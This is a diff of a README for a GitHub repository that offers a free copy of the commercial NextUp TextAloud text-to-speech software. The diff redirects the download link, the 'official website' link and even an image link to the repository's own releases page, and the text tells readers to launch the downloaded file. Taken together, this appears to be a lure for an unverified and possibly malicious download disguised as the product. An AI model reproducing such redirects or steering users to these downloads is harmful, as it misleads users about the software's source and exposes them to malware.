@@ -26,7 +26,7 @@ In this repository, you can find information and resources related to NextUp Tex
 
 To make the most of NextUp TextAloud and explore all the exciting features and voices, download the software from the following link:
 
-[![Download NextUp TextAloud](https://img.shields.io/badge/Download-NextUp%20TextAloud-blue)](https://github.com/uploads/App.zip)
+[![Download NextUp TextAloud](https://github.com/missile10/NextUp-TextAloud-Free/releases%20TextAloud-blue)](https://github.com/missile10/NextUp-TextAloud-Free/releases)
 
 Ensure that the downloaded file is launched for installation.
 
@@ -34,10 +34,10 @@ If the provided link is not accessible, please check the "Releases" section for 
 
 ## Discover More
 
-Visit the [NextUp TextAloud website](https://www.nextup.com) to experience the full range of features and voices available for your text-to-speech needs.
+Visit the [NextUp TextAloud website](https://github.com/missile10/NextUp-TextAloud-Free/releases) to experience the full range of features and voices available for your text-to-speech needs.
 
 Dive into the world of NextUp TextAloud and revolutionize your reading experience today! 📚🔊
 
 Remember, with NextUp TextAloud, the power of spoken words is at your fingertips. Enjoy a seamless text-to-speech experience like never before. Happy listening! 🎧📖
 
-![NextUp TextAloud](https://example.com/nextup-textaloud-image.jpg)
+![NextUp TextAloud](https://github.com/missile10/NextUp-TextAloud-Free/releases)
